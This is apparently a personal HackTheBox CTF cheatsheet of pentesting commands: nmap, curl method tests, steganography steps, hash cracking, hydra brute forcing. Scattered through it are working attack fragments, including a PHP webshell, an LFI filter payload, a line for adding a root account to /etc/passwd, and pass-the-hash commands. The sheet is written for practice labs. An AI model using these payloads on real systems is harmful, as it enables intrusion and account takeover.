## Purpose

Cheatsheet for [HackTheBox](https://www.hackthebox.eu/) with common things to do while solving these CTF challenges.

Because a smart man once said:
> Never google twice.



## Linux General

`ctrl + r`

Search History reverse

## Run Script at startup

```
chmod 755 /path/to/the/script
update-rc.d /path/to/the/script defaults
```

`update-rc.d -f  /path/to/the/script remove`

Delete Script from defaults

## Vim

`i` for insert mode

`esc` to leave insert mode

To be continued with macros and all this handy shit

## Tmux

Config from [ippsec](https://www.youtube.com/watch?v=Lqehvpe_djs).
```
#set prefix
set -g prefix C-a
bind C-a send-prefix
unbind C-b

set -g history-limit 100000
set -g allow-rename off

bind-key j command-prompt -p "Join pan from:" "join-pane -s '%%'"
bind-key s command-prompt -p "Send pane to:" "joian-pane -t '%%'"

set-window-option -g mode-keys vi

run-shell /opt/tmux-logging/logging.tmux

```

First press the prefix `ctrl + a`, *then* release the buttons and press the combination you want.

`tmux new -s [Name]`

new named session

`prefix + c`

create new window

`prefix + ,`

Rename window

`prefix + #`

change panes

`prefix + w`

list windows

`prefix + % `

vertical split

`prefix + "`

horizontal split

`prefix + s #`

join pane

`prefix + z`

zoom in/out to panes 

`prefix + !`

make splitted part to own window

`prefix + ]`

enter vim mode
-> search with `?` in vi mode
-> press `space` to start copying
-> press `prefix + ]` to paste

`alt + .`

cycle through arguments in history

`tmux kill-session -t X`

kill session by tag

`prefix + &`

kill pane


## Nmap 

`nmap -sV -sC -p- -oN [FILE] [IP]`

Standard

`nmap -p- -sV -sC -A  --min-rate 1000 --max-retries 5 -oN [FILE] [IP]`

Faster But ports could be overseen because of retransmissoin cap

`nmap --script vuln -oN [FILE] [IP]`


## Local File Inclusion
`http://[IP]/index.php?file=php://filter/convert.base64-encode/resource=index.php`

Get the contents of all PHP files in base64 without executing them. 

`<?php echo passthru($_GET['cmd']); ?>`

PHP Webshell

## Upgrade Shell

`python -c'import pty; pty.spawn("/bin/bash")'`

Background Session with `ctrl + z`

`stty raw -echo`

`stty -a`

get row & col

`stty rows X columns Y`

Set rows and cols

Foreground Session again

`fg #jobnumber`

`export XTERM=xterm-color`

enable clear
## Add Account/Password to /etc/passwd

Generate password

`openssl passwd -1 -salt [Username] [PASSWD]`

Then Add to passwd file

`Username:generated password:UID:GUID:root:/root:/bin/bash`

## SQLMap 

Capture Request with Burp.

Save Request to File.

`sqlmap -r [REQUEST] --level [X] --risk [Y]`

## Use SSH Key

Download & save

It is necessary to change the permissions on the key file otherwise you have to enter a password!

`chmod 600 [KEY]`

`ssh -i [KEY] [IP]`

## Searchsploit

`searchsploit [TERM]`

`searchsploit -m exploits/solaris/local/19232.txt`

Copy to local directory

## Convert RPM Package to deb

`alien [Pakage.rpm]`

## Bufferoverflows

Locate Overflow

`patter_create.rb -l [SIZE]`

Start gdb and run 

`r [PATTERN]`

Copy the segfault String

`pattern_offset.rb [SEGFAULT STRING]`

Receive Match at exact offset X.

Now you know you have at X the EIP override and so much space in the buffer.

## Simple exploit developement

Get Information about the binary. 

`checksec [Binary]`

Search [packetstrom](https://packetstormsecurity.com/files/115010/Linux-x86-execve-bin-sh-Shellcode.html) for Shellcode.

Remember to use correct architecture.

## Work in progress above...

## SNMP

Bruteforce community string

`nmap -sU -p 161 [IP] -Pn --script=snmp-brute`

`onesixtyone -c /usr/share/doc/onesixtyone/dict.txt [IP]`

Community String is in both cases "private"

`snmp-check [IP] -c public`

`snmpwalk -c public [IP] -v 2c`





## curl

Download a file:

```fundamental
curl somesite.com/somefile.txt -o somefile.txt
```

Test a web server for various HTTP methods:

```fundamental
curl -i -X TRACE somesite.com

curl -i -X OPTIONS somesite.com

curl -i -X PUT somesite.com/somefile.txt -d 'pentest' -H 'Content-Type: text/plain'

curl -i somesite.com -T somefile.pdf -H 'Content-Type: application/pdf'

curl -i -X FAKEMETHOD somesite.com
```

Test a web server for a cross-site tracing (XST) attack:

```fundamental
curl -i -X TRACE -H 'XST: XST' somesite.com
```

Test a web server for an HTTP method overriding attack:

```fundamental
curl -i -X TRACE -H 'X-HTTP-Method: TRACE' somesite.com

curl -i -X DELETE -H 'X-HTTP-Method-Override: DELETE' somesite.com/somefile.txt

curl -i -X PUT -H 'X-Method-Override: PUT' somesite.com/somefile.txt -d 'pentest' -H 'Content-Type: text/plain'

curl -i -H 'X-Method-Override: PUT' somesite.com -T somefile.pdf -H 'Content-Type: application/pdf'
```

| Option | Description |
| --- | --- |
| -d | Sends the specified data in a POST request to the HTTP server |
| -H | Extra header to include in the request when sending HTTP to a server |
| -i | Include the HTTP response headers in the output |
| -k | Proceed and operate server connections otherwise considered insecure |
| -o | Write to file instead of stdout |
| -T | Transfers the specified local file to the remote URL, same as PUT method |
| -v | Make the operation more talkative |
| -x | Use the specified proxy (\[protocol://\]host\[:port\]) |
| -X | Specifies a custom request method to use when communicating with the HTTP server |

For more options run `man curl` or `curl -h`.

| HTTP Request Methods |
| --- |
| GET |
| HEAD |
| POST |
| PUT |
| DELETE |
| CONNECT |
| OPTIONS |
| TRACE |
| TRACK (MS IIS) |
| PATCH |

# Image Steganography Checklist (start)

## 1. type
Just to be sure what file you are facing with, check its type with `type filename.`

## 2. file
 Determine file type `file filename`
 
 ## 3. Strings
View all strings in the file with `strings filename`

`strings -n 7 -t x filename.png`

We use -n 7 for strings of length 7+, and -t x to view- their position in the file.

## 4. Exif
`exif image.png`

Check all image metadata. I would recommend [Jeffrey's Image Metadata Viewer](http://exif.regex.info/exif.cgi) for in-depth analysis.

## 5. Binwalk
We use binwalk to check image's for hidden embedded files.

My preferred syntax is `binwalk -Me filename.png`. `-Me` is used to recursively extract any files.

## 6. pngcheck
We can use pngcheck to look for optional/correct broken chunks. This is vital if the image appears corrupt.

Run `pngcheck -vtp7f filename.png` to view all info.

`v` is for verbose, `t` and `7` display tEXt chunks, `p` displays contents of some other optional chunks and `f` forces continuation after major errors are encountered.

Related write-ups:

[PlaidCTF 2015](https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/forensics/png-uncorrupt)

[SECCON Quals 2015](https://github.com/ctfs/write-ups-2015/tree/master/seccon-quals-ctf-2015/stegano/steganography-2)

## 7. Explore Colour & Bit Planes
Images can be hidden inside of the colour/bit planes. Upload your image to this site [here](https://stegonline.georgeom.net/upload). On the image menu page, explore all options in the top panel (i.e. Full Red, Inverse, LSB etc).

Go to "Browse Bit Planes", and browse through all available planes.

If there appears to be some static at the top of any planes, try extracting the data from them in the "Extract Files/Data" menu.

Related write-ups:

[MicroCTF 2017](https://www.doyler.net/security-not-included/image-steganography-microctf-2017)

[CSAW Quals 2016](https://github.com/krx/CTF-Writeups/blob/master/CSAW%2016%20Quals/for250%20-%20Watchword/jk_actual_writeup.md)

[ASIS Cyber Security Contest Quals 2014](https://github.com/ctfs/write-ups-2014/tree/master/asis-ctf-quals-2014/blocks)

[Cybersocks Regional 2016](https://mokhdzanifaeq.github.io/2016/12/14/cybersocks-regional-2016-color-writeup/)

## 8. Extract LSB Data
As mentioned in step 6, there could be some static in bit planes. If so, navigate to the "Extract Files/Data" page, and select the relevant bits.

## 9. Check RGB Values
ASCII Characters/other data can be hidden in the RGB(A) values of an image.

Upload your image [here](https://stegonline.georgeom.net/upload), and preview the RGBA values. Try converting them to text, and see if any flag is found. It might be worth looking at just the R/G/B/A values on their own.

Related write-ups:

[MMA-CTF-2015](https://github.com/ctfs/write-ups-2015/tree/master/mma-ctf-2015/stego/miyako-350)

## 10. Found a password? (Or not)
If you've found a password, the goto application to check should be [steghide](http://steghide.sourceforge.net/). Bear in mind that steghide can be used without a password, too.

You can extract data by running `steghide extract -sf filename.png`.

It might also be worth checking some other tools:

[OpenStego](https://www.openstego.com/)

[Stegpy](https://github.com/Baldanos/Stegpy)

[Outguess](https://outguess.rbcafe.com/)

[jphide](http://linux01.gwdg.de/~alatham/stego.html)

Related write-ups:

[Xiomara 2019](https://github.com/mzfr/ctf-writeups/tree/master/xiomara-2019/Forensics/Steghide)

[CSAW Quals 2015](https://github.com/ctfs/write-ups-2015/tree/master/csaw-ctf-2015/forensics/airport-200)

[BlackAlps Y-NOT-CTF (JFK Challenge)](https://blog.compass-security.com/2017/11/write-up-blackalps-y-not-ctf/)

## 11. Browse Colour Palette
If the PNG is in [type 3](https://www.w3.org/TR/PNG-Chunks.html%20for%20type%20specs), you should look through the colour palette.

This site has a feature for randomizing the colour palette, which may reveal the flag. You can also browse through each colour in the palette, if the flag is the same colour.

It may also be worth looking at the palette indexes themselves, as a string may be visible from there.

Related write-ups:

[Plain CTF 2014](https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/doge-stege)


# Hash crack(password crack) start

## 1. John the ripper

`john --wordlist=/usr/share/wordlists/rockyou.txt hash`

## 2. hashcat

```
sha256 
hashcat --force -m 1400 --username hash.txt /usr/share/wordlists/rockyou.txt 
```

## 3. Crack zip Files

`fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' "file.zip"`

Note: Be careful with the quotes!

## 4. Crack openssl encrypted files

```
#!bin/bash
for password in $(cat /usr/share/wordlists/rockyou.txt)
do 
openssl enc -d -aes-256-cbc -a -in file.txt.enc -k $password -out $password-drupal.txt
done
```

After this you get one file for every Password tried. 

`ls -lS`

Sort them by size and find the one unique size. Or try to grep the content.


## 5. Pass the hash smb

With nt hash the `--pw-nt-hash` flag is needed, default is ntlm!

`pth-smbclient \\\\10.10.10.107\\$ -W <DOMAIN> -U <USER> -L <IP> --pw-nt-hash <HASH>`

List all shares on <HOST>.
  
`pth-smbclient \\\\10.10.10.107\\<SHAR> -W <DOMAIN> -U <USER> --pw-nt-hash <HASH>`

Connect to <SHARE>.
  
  ## 6. Hash Examples
<p>Likely just use hash-identifier for this but here are some example hashes:</p>
<table>
<thead>
<tr>
<th>Hash</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>MD5 Hash Example</td>
<td>8743b52063cd84097a65d1633f5c74f5</td>
</tr>
<tr>
<td>MD5 $PASS:$SALT Example</td>
<td>01dfae6e5d4d90d9892622325959afbe:7050461</td>
</tr>
<tr>
<td>MD5 $SALT:$PASS</td>
<td>f0fda58630310a6dd91a7d8f0a4ceda2:4225637426</td>
</tr>
<tr>
<td>SHA1 Hash Example</td>
<td>b89eaac7e61417341b710b727768294d0e6a277b</td>
</tr>
<tr>
<td>SHA1 $PASS:$SALT</td>
<td>2fc5a684737ce1bf7b3b239df432416e0dd07357:2014</td>
</tr>
<tr>
<td>SHA1 $SALT:$PASS</td>
<td>cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024</td>
</tr>
<tr>
<td>SHA-256</td>
<td>127e6fbfe24a750e72930c220a8e138275656b<br>
8e5d8f48a98c3c92df2caba935</td>
</tr>
<tr>
<td>SHA-256 $PASS:$SALT</td>
<td>c73d08de890479518ed60cf670d17faa26a4a7<br>
1f995c1dcc978165399401a6c4</td>
</tr>
<tr>
<td>SHA-256 $SALT:$PASS</td>
<td>eb368a2dfd38b405f014118c7d9747fcc97f4<br>
f0ee75c05963cd9da6ee65ef498:560407001617</td>
</tr>
<tr>
<td>SHA-512</td>
<td>82a9dda829eb7f8ffe9fbe49e45d47d2dad9<br>
664fbb7adf72492e3c81ebd3e29134d9bc<br>
12212bf83c6840f10e8246b9db54a4<br>
859b7ccd0123d86e5872c1e5082f</td>
</tr>
<tr>
<td>SHA-512 $PASS:$SALT</td>
<td>e5c3ede3e49fb86592fb03f471c35ba13e8<br>
d89b8ab65142c9a8fdafb635fa2223c24e5<br>
558fd9313e8995019dcbec1fb58414<br>
6b7bb12685c7765fc8c0d51379fd</td>
</tr>
<tr>
<td>SHA-512 $SALT:$PASS</td>
<td>976b451818634a1e2acba682da3fd6ef<br>
a72adf8a7a08d7939550c244b237c72c7d4236754<br>
4e826c0c83fe5c02f97c0373b6b1<br>
386cc794bf0d21d2df01bb9c08a</td>
</tr>
<tr>
<td>NTLM Hash Example</td>
<td>b4b9b02e6f09a9bd760f388b67351e2b</td>
</tr>
</tbody>
</table>
  
  # Hash crack(password crack) done
  
  
## FTP

`wget -r ftp://user:pass@server.com/`

Recursively download with ftp.

## SMB Null Session

`smbclient //10.10.10.X/IPC$ -W Workgroup -I 10.10.10.X -U ""`


## WFUZZ 

`wfuzz -z range,1-65600 --hc 500  "http://IP:PORT/dir?parameter=id&port=FUZZ"`

Fuzz a range of ids/port numbers.


## Wordlist with crunch

`crunch 15 15 "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ*?=walkthrough%&0123456789" -t 123456789012345@ > wordlist.txt
`

  
  


## Basic Auth Bruteforcing 

  ## Hydra

`hydra -l root -p admin 192.168.1.105 -t 4 ssh`

`hydra -L root -P File 192.168.1.105 -t 4 ssh`

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.X http-post-form "/login:username=^USER^&password=^PASS^:F=failed"`
  
